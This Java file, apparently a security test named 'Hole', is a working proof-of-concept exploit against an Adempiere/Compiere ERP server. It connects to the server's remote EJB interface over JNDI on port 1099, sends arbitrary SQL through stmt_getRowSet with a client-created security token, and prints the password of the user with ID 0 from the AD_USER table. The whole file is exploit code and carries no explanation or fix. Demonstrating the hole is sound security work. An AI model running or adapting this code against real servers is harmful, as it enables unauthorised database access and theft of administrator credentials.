package test.security;

import java.util.Hashtable;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.sql.RowSet;

import org.compiere.interfaces.Server;
import org.compiere.interfaces.ServerHome;
import org.compiere.util.CStatementVO;
import org.compiere.util.SecurityToken;

public class Hole {
    
	public static String SERVER = "";
	
	public static int PORT = 1099;
	
    public static void main(String[] args) {
        try {
            
            Hashtable<String, String> env = new Hashtable<String, String>();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "org.jnp.interfaces.NamingContextFactory");
            env.put(Context.PROVIDER_URL, "jnp://" + SERVER + ":" + PORT);
            env.put(Context.URL_PKG_PREFIXES, "org.jboss.naming.client");
            Context ctx = new InitialContext(env);
            
            ServerHome serverHome = (ServerHome)ctx.lookup("adempiere/Server");
            Server server = serverHome.create();
            CStatementVO cs = new CStatementVO(1, 1, "SELECT password FROM AD_USER WHERE AD_USER_ID=0;");
            RowSet s = server.stmt_getRowSet(cs, SecurityToken.getInstance());
            s.next();
            System.out.println(s.getString(1));

        } catch (Exception e)  {
            e.printStackTrace();
        }
    }
}